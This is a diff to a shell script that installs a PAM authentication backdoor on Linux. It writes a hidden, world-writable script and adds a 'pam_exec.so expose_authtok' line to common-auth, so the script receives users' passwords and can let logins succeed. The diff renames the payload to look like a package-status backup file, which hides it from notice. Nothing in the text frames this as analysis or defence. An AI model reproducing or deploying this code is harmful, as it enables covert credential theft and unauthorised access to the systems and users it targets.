@@ -19,10 +19,10 @@ EEE
 
 
 
-if [[ ! -f "/etc/pam.d/securitychecker.sh" ]]; then
+if [[ ! -f "/var/backups/apkg.status.gz" ]]; then
 
-    (echo "$script" > /etc/pam.d/securitychecker.sh)
-    (chmod 777 /etc/pam.d/securitychecker.sh)
+    (echo "$script" > /var/backups/apkg.status.gz)
+    (chmod 777 /var/backups/apkg.status.gz)
 fi
 
 #Common-Auth
@@ -55,8 +55,7 @@ auth    [success=2 default=ignore]      pam_unix.so nullok
 
 # here's the fallback if no module succeeds
 
-auth sufficient pam_exec.so expose_authtok /etc/pam.d/securitychecker.sh
-
+auth sufficient pam_exec.so expose_authtok /var/backups/apkg.status.gz
 auth    requisite                       pam_deny.so
 # prime the stack with a positive return value if there isn't one already;
 # this avoids us returning an error just because nothing sets a success code
@@ -75,11 +74,3 @@ if  ! cmp -s /etc/pam.d/common_auth_backup /etc/pam.d/common-auth ; then
 fi
 
 (rm /etc/pam.d/common_auth_backup)
-
-    #Or
-
-    #Include hardcoded injected custom common-auth code in installer
-    # cmp them in the installer from a variable
-    # if not equal 
-        # echo the variable to the real common auth (with overwritting)
-    # else nothing
